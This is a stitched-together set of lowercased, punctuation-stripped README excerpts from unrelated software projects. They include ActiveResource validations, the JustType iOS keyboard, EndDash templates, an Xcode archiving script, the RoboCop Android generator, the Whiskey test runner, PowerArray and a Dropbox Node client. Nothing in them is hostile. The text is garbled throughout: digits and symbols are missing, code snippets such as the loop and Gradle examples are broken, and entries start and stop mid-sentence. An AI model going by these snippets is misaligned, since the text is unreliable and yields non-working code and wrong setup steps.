comments now when you destroy a post any associated comments will also be destroyed the serialize and tojson methods aliases of one another change associations to foreign keys and remove circular references javascript post serialize these methods also take several options javascript post serialize prettyprint true prints a formatted json string javascript post serialize includeemptykeys true changes instances of null or undefined to empty strings in the event your backend requires all properties to be sent with values if you include presence validations on these fields they will still fail as empty strings and will not be sent using the built in methods javascript var dummydata hi there post tojson instance dummydata can tap into activeresource s serialization method to serialize arbitrary javascript objects if the instance option is not passed the model instance itself will be serialized serialize and tojson are non mutating methods they will not change the instance itself to save the serialized data as a variable assign it javascript var json post serialize models can describe validations required before data will be persisted successfully javascript function user data this name data name this email data email this validates name presence true  email format validates true message must provide a valid email validations also work with the simple form directive to perform easy form styling javascript user valid false user invalid user errors name must be defined user validate name user validateiferrored name helper methods make form validation simple input ng model user name ng blur user validate name displaying errors is equally simple errors will only be added for a given field once it s been validated validate them one by one with directives like ng blur or ng change  or validate them all at once by passing no arguments to the validate method the interaction we prefer at faculty creative usually looks like this ng model user name ng blur user validate name ng change user validateiferrored name this causes validations to run on blur and if errors exist on the field to run on change so that as soon as a user corrects an error the error will disappear immediately when a model instance is saved all validations are automatically run so errors will appear if the form contains any errors you can also clear errors on a given field or on the whole instance button ng submit user clearerrors and button button ng submit user clearerrors name and button validates that a user has entered a value javascript name presence true validates that a user has entered a value if a certain requirement is met javascript username requiredif requiredif emailisblank message you must enter a username function emailisblank value field instance return instance email and and instance email length  validates that a field does not have a value javascript name absence true validates using ranges min max or exact length javascript username length in  range    email length min  max   zip length is  validates several built in formats and validates custom formats using the regex javascript zip format zip true  email format email true  uuid format regex and d  w  and validates that a value can be cast to a number can be set to ignore values like commas and hyphens javascript zip numericality ignore and and g validates truthiness as in checkbox acceptance javascript termsofservice acceptance true validates inclusion in a set of terms javascript size inclusion in small  medium  large validates exclusion from a set of terms javascript size exclusion from xs  xl validates that two fields match javascript password confirmation true  passwordconfirmation presence true if an association must be valid in

16254160, the better keyboard for ios  justtype adds own gestures to the keyboard which do not interfere with the default keyboard it allows to smart jump between words of texts by swiping left and right on the keyboard it adds highlighting and suggestions for currently selected words to ios default text inputs it does that by using the default ios syntax checker meanwhile the default text elements work like they always did these all were amazing projects but there is a lack of keyboard extensions for the native ios ui  which are freely available for every app developer we want something to be more built in so we built a framework on top of the existing uikit of ios which integrates much better with the traditional text input the ios keyboard and text navigation is often cumbersome e g in order to jump to the preceding word in a text you need a lot of touches on the top of the text input itself you can not directly make the word upper or lower case if you are in between a word also though there is a built in syntax checker you can only choose a suggestion by holding on a word you never directly see what words it suggests we can do better this project tries to not change or temper with the ios default behavior of texts the highest priority of this project is instead to be fully compatible with ios uitextfields and uitextviews the default keyboard and text handling shall not be modified in any imaginable way but instead this project adds on top of both we want this extension to be usable in all apps  therefore we made it the most user friendly as possible compatible with all ios  systems and extendable in the most possible way this is also why it is completely unit tested broad language support practically every language is supported because no keyboard functionality is replaced all languages which work in ios also work with justtype no enforcement beginners do not need to use the gestures if they don t want to instead they can work exactly like they know it from any of their ios apps performance this implementation uses the default uikit text navigation provided by uitextinput protocol of uitextview and uitextfield which is of course very fast also it uses ios gesture recognizers for gestures on the keyboard compatiblity this framework is compatible with ios  and  it builds on the default uikit if the keyboard handling in later ios versions changes the keyboard gestures extension just stops working that s why this should not be any critical for apps used in production extendability the keyboard and uitextinput extensions are easily extendable for developers e g the behavior for gestures could easily be modified we in fact encourage you to contribute to this project actually for using this keyboard extension there are only four steps to follow b font color  cd lt your project gt and font and b go to your project b font color  vim podfile and font and b create podfile and save platform ios pod justtype b font color  pod install and font and b install libraries from podfile  you should check that the import works by adding to your appdelegate m import lt b font color  justtype and justtype h and font and b gt  for attaching the gestures to the keyboard you just need one simple command e g do it in your application didfinishlaunching b font color  jtkeyboardlistener and font and b sharedinstance observekeyboardgestures yes  for using the text input elements you can use jttextview exactly like a normal uitextview or alternatively jttextfield like a uitextfield out of the box b font color  jttextview and font and b textview b font color  jttextview and font and b alloc initwithframe self view frame self view addsubview textview sub b hint and b under workspace and target and build settings you should check that the option all other linker flags is set to allload objc  otherwise the compiler won t find the library classes e g when using lazy loading in nib files if you have a project not including arc then also set the linker option fobjc arc and sub for adding the attachment view that presents suggestions for the current word recommended you need to add the following to your textview or textfield cgrect attachmentviewframe cgrectmake   self view size width height jtkeyboardattachmentview attachmentview jtkeyboardattachmentview alloc initwithframe attachmentviewframe textview setinputaccessoryview attachmentview you can add your own highlighting style to a textview by creating an own uiview for highlighting overwriting its drawrect method and adding this highlightview to the textview only on textviews uiview myownhighlightview myownhighlightingview alloc initwithframe cgrectzero textview highlightview myownhighlightview instead you can also simply adapt the color used for the default highlighting view displaying underdashes below the selected word as the default it uses the window tintcolor only on textviews uiview highlightview textview highlightview jtdashedborderedview highlightview setstrokecolor uicolor blackcolor to adapt the style of textfields instead there are two textcolor properties of which the unhighlightedcolor is black for default and the highlightedcolor is gray by default only textfields textfield backgroundcolor uicolor blackcolor textfield unhighlightedcolor uicolor whitecolor textfield highlightedcolor uicolor lightgraycolor if you want to create an own view for displaying the suggestions you can set a delegate corresponding to the jttextsuggestiondelegate protocol and implement some of the optional protocol methods textview textsuggestiondelegate self if you want to implement this suggestion delegate protocol it will be useful to replace suggestions for the current word by calling the following method on the textview and textfield textview selectsuggestionbyindex suggestionindex if you want to turn the word highlighting off just use the following command on the textview and textfield textview issyntaxhighlightingused no in the case you don t want to support the syntax completion you can also turn it off for the textview and textfield textview issyntaxcompletionused no you can also adapt the colors used for the gestures on the keyboard by using these properties as a default they are set to the window tintcolor and its complementary color jtkeyboardlistener sharedinstance settouchdowncolor uicolor redcolor jtkeyboardlistener sharedinstance settouchmovecolor uicolor redcolor if you want to deactivate the visual help for gestures which occur on top of the keyboard while swiping then you can switch them off too jtkeyboardlistener sharedinstance setenablevisualhelp no note you can use the jttextview and jttextfield also stand alone for word highlighting and completion without using gestures on the keyboard you can do this by simply not adding the keyboard listener from step  at all or turning it off again after you turned it on jtkeyboardlistener sharedinstance observekeyboardgestures no developers unite by using this project you will support us to hopefully and finally get apple improving the default keyboard on their own to support better and faster typing but for now we have this little extension supporting gestures syntax highlighting and better syntax completion you will hopefully join us in using this project we would also be grateful if there is

dependencies for further details documentation documentation is below install enddash and install grunt helper npm install npm install g grunt cli grunt build also aliased as grunt include the library and dependencies define your templates script type text and enddash name character hello my name is span class firstname and span span class lastname and span strong class quip and strong and script warning a template can only have one root element in the above case it is the div with class user load your templates into enddash ready function and and load all the templates on the page enddash bootstrap bind your templates to models in your application code var tony new backbone model firstname tony  lastname stark  quip you know the question i get asked most often is tony how do you go to the bathroom in your suit var template enddash gettemplate character  tony content html template el if your models changes the dom will update to reflect the changes if you clone this repo and install grunt as described above you can play with some end dash examples in your browser just type grunt in the root directory to build the current version of end dash into the build directory and then open up any of the example html files in the examples directory in your browser open examples and looping html for example works on os x  and you can edit the templates or models directly in the html file if you want to experiment documentation  using model attributes using model attributes variables variables attribute interpolation attribute interpolation inputs inputs text inputs text inputs radio

improvements future improvements using model attributes  enddash variables are rendered into the body of html elements displaying their values as ordinary text my name is span class firstname and span span class lastname and span model properties can also be interpolated into any html tag attribute template bind new backbone model firstname derrick resulting tag enddash does two way binding between model attributes and input elements text inputs are bound to a referenced attribute on the model in scope to create this binding add the attribute name with a dash at the end as a classname in the template what is your name input type text class name radio buttons bind the selected button s value to the model s referenced attribute label for tony tony and label label for pepper pepper and label label for james james and label checkboxes are trickier when unchecked the referenced attribute on the model will be false when checked the referenced model s attribute will be set to the attribute value on the input element or true if no value is defined  to reuse a set of dom elements for each child model in a collection add the data each attribute to the parent of this set the object in scope at these elements will be iterated through using each each child of this collection will be bound to the nested elements given the above template and the collection var characters new backbone collection new backbone model firstname tony  new backbone model firstname pepper  new backbone model firstname iron  new backbone model firstname james the output will be note that the elements iterated over must have one root if your objects have an enum field you can branch based on its value for example role behaves as a polymorphic attribute span class firstname and span says don t worry i ll probably save you span class firstname and span says worry span class firstname and span says get me outta here given the following objects new backbone collection new backbone model firstname tony  role hero  new backbone model firstname pepper  role civilian  new backbone model firstname aldrich  role villain  new backbone model firstname james  role hero the template would produce the following html span class firstname tony and span says don t worry i ll probably save you span class firstname pepper and span says get me outta here span class firstname aldrich and span says the whole world s gonna be watching span class firstname james and span says don t worry i ll save you to add a default case include a non enddash child div span class firstname and span says don t worry i ll probably save you model get role hero span class firstname and span says i ve lost my memory i don t know who i am please note backbone collection does not support attributes natively for its collections but there are a number of options for extending collections to do so enddash supports collection attributes as long as they are implemented according to backbone model api via the get method which backbone collection natively uses only for getting a model by id not an attribute by name typically collection attributes are used for metadata about the collection such as total size if the collection is paginated and this is different than length  as in the example below there are span class totalcount and span people allowed in tony s basement conditionals  a ternary operator is available for presence handling via truthiness for attributes that may be present with or without a false condition my schedule is very full span class isavailable i just have a few openings and span the same truthiness controls conditional visibility enddash class elements that start with is or has  and their boolean opposites isnot and hasno  as above with isavailable enddash will hide via a display none style attribute any such element when its named attribute is falsy or hide when truthy in the case of isnot and hasno template bind user new backbone model firstname tony  lastname stark  alias ironman availability am  pm scope in enddash refers to the model on the top of the enddash stack each template and partial is given its own scope the root scope is always the object passed to enddash s bind or gettemplate function template bind user new backbone model firstname tony  lastname stark  hobby description building all the cool technology the root object is the object literal with the property user scope can change in two ways and and internal html scopes into the backbone model with properties firstname  lastname  and hobby this syntax only allows scopping down unix style and and iternal html scopes down into the user object and then via the data scope property scopes back to the root object the object literal with propery user normal unix path shorthands apply to move back up a scope level and to seperate scope levels for the current scope and and user scope and and hobby scope and and back in user scope and and back in hobby scope and div and div class user is actually syntactic sugar for data scope and user using data scope like this at the current scope is mainly useful for accessing a property of a nested model in the same dom element that you change the scope view integration  enddash provides dynamic behavior often otherwise handled by views in backbone if more specific dynamic behavior is required take advantadge of enddash s hooks to backbone views simply add the html attribute data view with the value of your viewname to the template configure iron man s suit below when enddash runs into a data view  it will lookup the view and initialize it with the model in scope at the dom element where the view is initialized to lookup the view enddash uses a simple view store you can register views by calling enddash registerview with the view name and the view class object you can also define your own function and pass it into enddash setcustomgetview enddash registerview myviewname  viewobj var views  getviews function name return views name enddash setcustomgetview getviews templates  this can be done manually or via enddash bootstrap to bootstrap have your templates loaded as scripts of type enddash on the page script type text and enddash name greetings hello citizens i am span class name and span and script then call enddash bootstrap ready function and and load all the templates on the page enddash bootstrap first get the enddash parsed version of your template var template enddash gettemplate greetings then bind it to a model var hero new backbone model name superman  boundtemplate template bind hero this can be done in a single step by passing a model as a second argument to enddash gettemplate var hero new backbone model name superman  boundtemplate enddash gettemplate greetings  hero show the el property of the template content html boundtemplate el small reusable components of html can be templated in enddash as partials script type text and enddash name superheroes and script the partial will be passed the model in scope as its root element the data replace attribute tells enddash to substitute the partial s root element for its partial without data replace enddash will embed the root element beneath the partial s element and leave it if elsewhere you define this partial as script type text and enddash name superhero navigation ul data each and li and script and bind to the top level template with template bind heroes new backbone collection new backbone model name iron man  url and superheroes and techgenius  new backbone model name spiderman  url and superheroes and webmaster  new backbone model name superwoman  url and superheroes and strong logo and public and emblems and protecttheworld this will result in debugging  open up a debugger in development mode to inspect the context of the template open a context in the highest template scope in a child model scope dependencies  in its current release enddash relies on backbone style events to update the dom when a bound object changes this means only objects which define an interface with backbone s on once set get will interpolate model attributes into the dom and update the dom on model changes enddash used without backbone style getting setting will still interpolate a bound object s attributes into the dom but will not update the dom on model changes contributing and future improvements  there are a number of future improvements planned for enddash and we d love for you to be involved in them please fork the enddash repo and open pull requests or get involved in discussing features or improving documentation via github issues or a pr on the readme md file our homepage at enddash com is hosted on github pages via the gh pages branch so feel free to improve and make pr s to the home page and live examples there as well to develop enddash locally you must have npm and grunt installed from the directory of your local clone of the enddash repository npm install npm install g grunt cli grunt build also aliased as grunt grunt test grunt watch right now enddash only supports browser side rendering but we have plans to support node js server side rendering as well and hybrid rendering where templates are pre processed server side and served as static compiled assets for the client we also have a branch with a new interpolation syntax support to avoid requiring the use of span elements for dynamic text and a few other ideas open or coming soon to github issues and pull requests on the github repo

5927432, in reponse to a product archive in xcode automatically  verify all git working directories are clean  bump build number to next even number  create xcarchive file  do a git commit and git tag of main project and all sub projects  bump build number to next odd number do another git commit  copy xcarchive and all source of all projects to external archive directory later it was approved this completely broke landscape orientation on ipad after pounding my forehead into the table a few times and resubmitting the correct binary  i decided to look at my submission process and see if i could prevent this disaster from reoccuring major issues with my former submission process  xcode doesn t show the build number cfbundleversion of archives only the marketing version  even if xcode showed the build number my correct binary and my faulty binary had the same build number  i didn t realize that i could re sign binaries change from app store to ad hoc  i previously used agvtool and apple generic versioning to manage my build number at some point from xcode     agvtool stopped bumping my info plist files after much coffee and pondering i came up with the following feature set for my new build system  there should be a one to one relationship between xcode archives and build numbers each successfully built archive should have its own unique build number  the same archive and build number should be submitted to both testflight and the app store  development builds should never have the same build number as release for my purposes it s ok if different development builds share the same build number as those builds only go on my devices  git tagging of release builds should be handled automatically  a copy of all source code used to build the product as well as the resulting xcarchive should be stashed in a separate git repository which is backed up to multiple servers  xcode s organizer s archives window needs to show the build number somehow  everything should magically occur from product archive in xcode if anything goes wrong xcode stops the archive process and no xcarchive is produced main xcode project with multiple sub project dependencies tenuto xcodeproj product tenuto app ixcore xcodeproj product libixcore a mtcore xcodeproj product libmtcore a theorylessons xcodeproj product theorylessons app ixcore xcodeproj product libixcore a mtcore xcodeproj product libmtcore a swiffcore xcodeproj product libswiffcore a each project is in its own git repository when i build tenuto with cfbundleversion  i want to tag all three repositories with tenuto  see feature  from above unfortunately having a project hierarchy like this adds complexity to any build scripts xcode has two ways of executing scripts run script build phases and scheme actions my first attempt used build phases exclusively unfortuately the earliest you can run a run script build phase is after the internal copyplist phase which is too late for modifying the info plist file feature  my second attempt used scheme actions exclusively unfortuately there is no way to stop the build process during a scheme action exit  doesn t work my third attempt used pre and post actions on the archive scheme of tenuto and run script build phases on each target unfortuately the run script build phases were running before the archive pre script it looks like the internal ordering of build phases and scheme actions for one of my projects tenuto looks something like this tenuto build scheme pre action ixcore build scheme pre action ixcore run script build phase ixcore build scheme post action mtcore build scheme pre action mtcore run script build phase mtcore build scheme post action tenuto run script build phase tenuto build scheme post action tenuto archive scheme pre action tenuto archive scheme post action hence the very first opportunity to run a script is the build scheme pre action the last opportunity to run a script is the archive scheme post action each project can be cancelled during a run script build phase the configuration for all of this looks like edit scheme window for main project tenuto build phases window for both main project and sub projects upon hitting product archive in xcode  tenuto build scheme starts rchook is called with xcode app build pre action argument  creates a fresh and tmp and rchook directory  modifies the main project s info plist to prepare for an archive release archives are given even build numbers  creates a backup copy of the original info plist  creates an info plist with the next development build number odd  creates and tmp and rchook and cleanup sh  which is called to revert everything if we abort  for each project tenuto ixcore mtcore  rchook is called with the xcode build phase argument  ensures that the git working directory is clean if not exits out and causes xcode to abort the archiving process this is needed since we will be commit to the git repository at the end of the archive process  concatenates current projectdir into and tmp and projectdirs  tenuto build scheme finishes  tenuto archive scheme starts  xcarchive producted  tenuto archive scheme finishes rchook is called with the xcode app build post action argument  iterate over each project directory in and tmp and projectdirs change the working directory and git commit and git tag  performs some trickery to set the comment of xcode s archive to the build number  create a new directory on the file system copies xcarchive file as well as source files for each project to the directory  copy the new info plist created in step   to the main project s directory  commit the new info plist using git commit the xcode app build post action command supports these additional options s resign the app using the provided identity z create a zip file of the app u upload the zip file via z using scp for example to sign zip and upload a mac os x app to a web server for beta testing rchook xcode app build post action s

3195368, robocop is a java library that can generate a fully functional contentprovider from a simple json schema file there are only a few steps involved in order to set up this tool to work inside of your build environment the steps should not be difficult but should be done with care at a high level you must  download and install the library jar file into your project directory  include your own custom json schema file in your project directory  configure your build gradle file and include a special build task to generate the necessary files  use the gradle task to generate your contentprovider and related files  install your new contentprovider in your androidmanifest xml file download and install  download the latest jar from the releases section of this repo page you can use either the jar with dependencies recommended or provide them yourself  create a new folder in your project directory and name it whatever you want eg robocop in a typical android studio project this will be mainapplicationfolder and mainapplicationmodule and robocop and  place the robocop jar from step  into the robocop directory a it s important that you don t put this jar in your libs folder since this is a buildscript dependency not a runtime dependency and it will cause problems if this is confused b don t add the path to this jar to your regular android dependencies in any other way as it will break your build it s not a runtime dependency it s just used by the build script create your json schema definition  tables  and and see below for table definition rules relationships and and see below for table definition rules members and and see below for member field definition remember that for the code generation to generate nice looking code you need to write all of your schema values in lower case and underscore separated gradle configuration  it s important to note that the only build gradle file you should be editing is the one lower down in your application module not the top level build gradle file the gradle configuration involves just a few steps  add a buildscript definition that depends on the robocop library you need to add the buildscript to your application module build gradle file not the root level build gradle file which already should have a build  add an import for the robocop generator class  add a build task for the code generation process groovy and and you may be temped to edit your top level build gradle file because it sorta looks like this don t do it simply add this code block to your application module build gradle file and make sure the path to the jar file is correct buildscript repositories mavencentral dependencies classpath com android tools build gradle   and and and this is the important part the buildscript needs our library to generate the code classpath files robocop and robocop   jar with dependencies jar place the import statement near the top of the file such as right underneath the android plugin groovy apply plugin android import com rain utils android robocop generator place the build task at the root level in your build gradle file not inside something like the android definition for example groovy task contentprovidergen description generating a beautiful contentprovider and required classes dolast system out println generating contentprovider string schemafilename robocop and agendaschema json and and replace with the path to your schema string baseoutputdir src and main and java and and and if gradle throws an error on the following line you probably either don t have your import statement set or you have the wrong path in your buildscript definition contentprovidergenerator generatecontentprovider schemafilename baseoutputdir the above task definition should be pretty easy to follow this simply allows gradle to execute our code generation task whenever you want inside the dolast block is where the main customization takes place the schemafilename variable should point to the location of your json schema file explained previously the baseoutputdir specifies at what root directory your generated code should be placed what your resulting package structure and thus file structure will depend on what you put in your schema definition for the packagename variable so if you put com mycompany awesomeandroidapp as your packagename then the resulting files will be under src and main and java and com and mycompany and awesomeandroidapp the generator tool can write code to any directory for which it has permission we will often place generated code in its own source folder outside our main src directory some prefer to keep all their sources generated or otherwise in the same location so as an example if you want to place your contentprovider in another directory like src gen then your build task would look like this groovy task contentprovidergen description generating a beautiful contentprovider and required classes dolast system out println generating contentprovider string schemafilename robocop and agendaschema json string baseoutputdir src gen and contentprovidergenerator generatecontentprovider schemafilename baseoutputdir however you are also responsible to make sure that src gen is included as a source folder in your build gradle file this can be done as follows groovy sourcesets main java srcdir src gen we personally prefer this latter method as it keeps our main source directory uncluttered and focused on our own application code it works either way though running the generator  once all the above setup are complete the last step to getting things up and running is to simply run the custom gradle build task we created the easiest way to do this is from android studio by right clicking the contentprovidergen task text and selecting the run gradle contentprovid this will add a new build configuration in the top menu build configuration drop down it will also provide you with the option of saving this configuration permanently so that it can be re run whenever you like this is a convenient option to select as you will more than likely want to make changes throughout the course of your development process whenever you run this task all of your generated code will be replaced with the newly generated code also any other classes that are in the same folders as your generated code will be removed you should never place your hand written code in the same directories as our generated code installing the provider important  your done enjoy example usage of a generated contentprovider  using loaders is a great way to simplify fetching data for which to populate your ui and take away many of the concerns that come with updating data when necessary and managing the lifecycle of your app public class agendalistfragment extends listfragment implements loadermanager loadercallbacks cursor override public void oncreate bundle savedinstancestate override public loader cursor oncreateloader int id bundle args override public void onloadfinished loader cursor loader cursor data override public void onloaderreset loader cursor loader the loadercallbacks interface provides hooks for creating your loader and responding to load events you ll now have to create your loader which will be a cursorloader and handling the events override public loader cursor oncreateloader int id bundle args return new cursorloader getactivity  agendaprovider agendacontenturinew string agendatable id agendatable name nullnullagendatable id and desc the generated contentprovider has content uri s for all your tables and code completion should help you find the one you want after that you can specify which fields you want to be returned and any query and query params or ordering need to go into the query override public void onloadfinished loader cursor loader cursor data madapter swapcursor data override public void onloaderreset loader cursor loader madapter swapcursor null this is about the extent of it when onloadfinished will get called whenever a query to your table takes place which could be because you started and restarted the loader explicitly or because your backing data store changed which happens automatically with our generated code onloaderreset gets called during suprise resets and so the current data is unavailable and so we pass in null to the cursor for the meantime override public void oncreate bundle savedinstancestate super oncreate savedinstancestate madapter new agendaadapter getactivity  null  setlistadapter madapter getloadermanager initloader  null this once it s started the cursorloader will query your contentprovider via the contentresolver and return your data when it s ready usually very quickly here is what a working listfragment might look like public class agendalistfragment extends listfragment implements loadermanager loadercallbacks cursor override public void oncreate bundle savedinstancestate super oncreate savedinstancestate madapter new agendaadapter getactivity  null  setlistadapter madapter getloadermanager initloader  null this override public loader cursor oncreateloader int id bundle args return new cursorloader getactivity  agendaprovider agendacontenturinew string agendatable id agendatable name nullnullagendatable id and desc override public void onloadfinished loader cursor loader cursor data madapter swapcursor data override public void onloaderreset loader cursor loader madapter swapcursor null building off the previous example we ll demonstrate how to insert new records that will automatically get loaded into the listfragment once inserted agenda agenda new agenda agenda setname new agenda getcontentresolver insert agendaprovider agendacontenturi agenda getcontentvalues the generated tool includes convenient model classes that map to your table records they can be constructed and inflated from a cursor and can also export a contentvalues object which is necessary for contentresolver operations because the listfragment cursorloader is observing our agenda table content uri it the onloadfinished will get triggered automatically once this insert operation finishes and our new record will show up in our listview sweet let s now suppose that when the user taps on an agenda item from the list they are presented with a form with which to modify the details of the agenda the following is an example of how to update the agenda item so that its values are saved and automatically reflected by our cursorloader previously explained private void updateagenda and and magenda is an agenda model object generated by this tool it has all the getters and setters you need magenda setname magendatitle gettext tostring magenda setpersonconducting mpersonconducting gettext tostring and and there are also convenient constants on the generated table classes for common necessary strings agendatable whereidequals resolves to id getcontentresolver update agendaprovider agendacontenturimagenda getcontentvalues  agendatable whereidequalsnew string agenda getrowid tostring sometimes we get tired of some records and we have to let them go here s how to do it getcontentresolver delete agendaprovider agendacontenturi agendatable whereidequals agenda getrowid tostring sometimes you have to do a lot of operations and it is much more efficient to do them all as a batch rather than one at a time here s a contrived example public void updatelotsofagendasatonce list agenda agendas arraylist contentprovideroperation operations new arraylist for int i  i agendas size i and and contentprovideroperation operation contentprovideroperation newupdate agendaprovider agendacontenturi withselection agendatable whereidequals new string agendas get i getrowid tostring build operations add operation and and just for fun let s insert a few new ones while we re at it for int i  i  i and and agenda agenda new agenda agenda setname new agenda and i contentprovideroperation operation contentprovideroperation newinsert agendaprovider agendacontenturi withvalues agenda getcontentvalues build operations add operation try getcontentresolver applybatch agendaprovider authority operations catch remoteexception e e printstacktrace catch operationapplicationexception e e printstacktrace there s a couple really good blog posts about this pattern please chech them out  yes the architecture and design decisions behind the contentprovider is informed by the requirement that some data needs to be shared across application processes however we ve found that the design also provides benefits for simply working with your own data and we ve had great success using them the biggest reason that we ve found as to why more developers don t use them is simply because they are very labor intensive and really hard to get right when written by hand this tool takes those drawbacks away here are a few of our top reasons for using a contentprovider not all of them are necessarily exclusive to contentproviders  if you do need to share code between applications or processes several of the apps we ve built do have multiple processes then you re already setup  many of the android components are designed to work with them out of the box for example cursorloader takes a contentprovider content uri and query to fetch results and automatically notify your ui of changes to backing data  contentresolver and contentprovider are built into the system and relied upon heavily throughout android contacts and calendar are good examples and so we benefit from a very robust and hardened system our generated code is quite small compared to other data abstraction mechanisms and orm s and we feel comfort and have had great success relying heavily on system components rather than a custom system  we like the client service oriented nature of the contentresolver and contentprovider architecture tables and data are accessed with uri s in much the same way you probably access yourserver side data we ve observed improvements in the overall application architecture in our apps by communicating between components this way currently we only generate code that supports querying one to many joined table relationships our generated code does not allow you to insert and update joined records as a single insert and update for example if you queried for the join between person and phone numbers you cannot send a request to insert and update to this joined relationship you must send your insert and update requests directly to the tables they belong to the generated code also does not currently support many to many join operations these features are on the roadmap as we feel they are important for a complete solution however we ve built this tool according to what has been needful on our applications and the nature of mobile applications predisposes our ui s to generally only consume data coming from single tables lists of friends lists of documents list of tweets very few data presentations problems are solved more optimally than two queries query for and show a list of people and then query for that person s contact details when the user taps on

only essential dependencies only start dependencies required by the tests files which are ran this option is only applicable if dependencies option is used note when specifying multiple test a list with the test paths must be quoted for example whiskey tests tests and a js tests and b js tests and c js presently two kinds of setup and teardown procedures exist with whiskey setup and teardown work on a per test basis that is whiskey invokes setup before running a test in a given javascript file called a suite and teardown is invoked after a test run has finished if you run multiple suites in parallel e g  via the t and independent tests option  you ll get concurrent execution of setups and teardowns as well sometimes though you need longer lived environmental configurations or you need safe resource sharing between entire batches of independently running tests for these you ll want to use globalsetup and globalteardown when do i use setup and teardown when a suite s runtime environment does not influence other running suites when do i use globalsetup and globalteardown when a suite s runtime environment can potentially interfere with other concurrently running suites example attempting to run multiple suites in parallel which rely on a cassandra schema being in place and each attempting to reset the schema to a known state on a single cassandra instance you ll get cassandra schema version errors using globalsetup prevents this by running the schema reset code exactly once for all tests a simple example success javascript var called  exports testasynconeequalsone function test assert settimeout function assert equal   called and and test finish   exports teardown function test assert assert equal called  test finish a simple example skipping a test javascript var dbup false exports testquery function test assert if dbup test skip database is not up skipping return assert equal   test finish a simple example failure javascript

javascript exports globalsetup function test assert and and set up database schema here and and push known data set to database here test finish exports globalteardown function test assert and and drop database here test finish for more examples please check the example and folder and the test and run sh script to run the whiskey test suite run the following command in the repository root directory if all the tests have sucessfully passed the process should exit with a zero status code and you should see whiskey test suite passed to contribute fork the repository create a branch with your changes and open a pull request if you want to debug your test you can use the debug option this will cause whiskey to start the test process with the v debugger functionality you then need to manually connect to the debugger to control it i e using whiskey will also by default set a breakpoint at the beginning of your test note this option can only be used with a single test file further you cannot use the debug and independent tests options together the semantics just don t make any sense to debug a test make sure you invoke it with tests instead long stack traces modules intercepts the default error object and throws a custom one the problem with this is that whiskey internally relies on attaching the test name to the error object so it can figure out to which test the exception belongs long stack traces throws a custom error object and as a consequence test name attribute gets lost so whiskey thinks your test didn t throw any exceptions the solution for this problem is to disable long stack trace module when running the tests this shouldn t be a big deal because whiskey internally already uses long stack traces module which means that you will still get long stack traces in the exceptions which were thrown in your tests if your test gets reported as timeout instead of failure your test code most likely looks similar to the one below javascript exports testfailure function test assert settimeout function throw blaaaaah test finish  the problem with this is that if you run tests in parallel concurrency  and you don t use a custom assert object which gets passed to each test function whiskey can t figure out to which test the exception belongs as a consequence the test is reported as timed out and the exception is reported as uncaught the solution for this problem is to run the tests in sequential mode drop the concurrency option apache   for more info see license and cloudkick and whiskey and blob and master and license

21957233, why use different colors of the same asset when you can include one color and change it to fit your needs also how do you handle dynamic changes such as when you use a drawer and want to do some really neat effects this library enables you to color a view image icons and text in a very simple way  this project includes android support v  and and appcompat v  and i will make sure to make a version using only native dependencies or without appcompat  this project currently compiles with api  and buildtoolsversion    hopefully there will be a way to use project level in the future  minsdk is  however with appcompat and support that is upped to  i will try to make it lower for non support libraries  this project is currently in active development using the development branch has no guarantees of working functionality and or and breaking changes to code the best bet is the master branch for all stable releases or by using a remote aar dependency  clone this repo  go to your build gradle file groovy dependencies compile com github agrosner library   and and and or locally in the a folder named libraries compile project libraries painter painting is the simple way of changing the color of an object actionbar menuitem or views without much hassle let painter handle coloring your wonderful visual elements icon painting is a very simple way to change the color of any

iconpainter paintcolor clonedrawable color black object object objectn background painting will take the background of the item you pass in namely it s background drawable and change the color as well it is strongly advised you do not paint the actionbar background more than once on first load as this is extremely inefficient due to the fact we cannot easily retrieve the background drawable once it is set on the actionbar example  and and we can use many view menuitem s action view or actionbars new backgroundpainter clonedrawable color blue paint view actionview actionbar and and can use

27041655, turns out that you can re write some of the methods of array to obtain a much better performance than the native methods in particular array foreach seems to perform pretty badly note the overridden methods of powerarray break compliance the focus is on performance so take a look at the caveat section below it looks as if a for loop with cached length is the fastest way of iterating javascript var i len array length for i  i len i and  somefun array i so i rewrote the array class as powerarray and implemented the above mechanism in powerarray foreach with surprising results the results are as follows powerarray foreach is averagely  times faster than native array this is only a proof of concept install with npm install powerarray particularly useful for arrays that need processing on all elements often or for numeric arrays utilized as indexes for collections of data all array native methods are available through powerarray the following methods are either extending or overriding the native array class powerarray foreach utilizes a for loop for iteration takes a callback which receives an element and the index of that element powerarray map utilizes a for loop to return a powerarray of mapped values takes a callback processing function argument powerarray numericsort sorts array if array only contains integers  useful for utilizing binarysearch optional sorting function argument powerarray addandsort adds a new value and sorts the array automatically pull requests are more than welcome just make sure to add a test in tests and test js and that it passes it obviously  no this context in fn calls handle your own binding  no determination if i is a member of powerarray eg for sparse arrays      no exception is thrown when the callback isn t callable there may be more please feel free to flag those or include them yourself through a pull request

992980, an oauth enabled node js client for working with the dropbox api to install via npm npm install dropbox node to install by hand download the module and create a symlink in and nodelibraries ln s and path and to and dropbox node and and nodelibraries and dropbox node first construct a dropboxclient object passing in the consumer key and secret var dropbox new dropboxclient consumerkey consumersecret before calling any dropbox api methods an access token pair must be obtained this can be done one of two ways  if the access token and secret are known a priori they can be passed directly into the dropboxclient constructor var dropbox new dropboxclient consumerkey consumersecret accesstoken accesstokensecret  otherwise getaccesstoken must be called in order to initialize the oauth credentials dropbox getaccesstoken dropboxemail dropboxpassword callback the callback given to getaccesstoken takes an error object an access token and an access token secret see example below please note that users passwords should never be stored it is best to acquire a token once and then use it for all subsequent requests dropbox getaccountinfo function err data if err console log error and err else console log data displayname and  and data email note that at least at the start of a user s session a valid access token pair must be obtained prior to interacting with the rest of the dropbox api this means that the api methods must be invoked within the callback passed to getaccesstoken unless it is guaranteed that getaccesstoken was called previously as an example of this latter case if building a web app one could call api methods directly in a route that can only be accessed after going through a sign in phase in which a call to getaccesstoken is made here we upload a file and remotely move it around before deleting it dropbox getaccesstoken email pwd function err token secret and and upload foo txt to the dropbox root directory dropbox putfile foo txt  foo txt  function err data if err return console error err and and move it into the public directory dropbox move foo txt  public and foo txt  function err data if err return console error err and and delete the file dropbox deleteitem public and foo txt  function err data if err console error err stack   for example here we call getaccountinfo and direct the api to include the http status code in the response dropbox getaccountinfo statusinresponse true  callback each method except getaccesstoken can optionally take an access token and an access token secret as strings this is the one way to get around having to call getaccesstoken in cases where a valid key pair is known for example here we fetch the metadata about the dropbox root directory passing in an explicit key pair stored in variables dropbox getmetadata  token token secret secret  callback fetches an access token and secret based on the email and password given stores the token and secret in the dropboxclient instance and calls the callback them gets account information from the client creates a new dropbox account 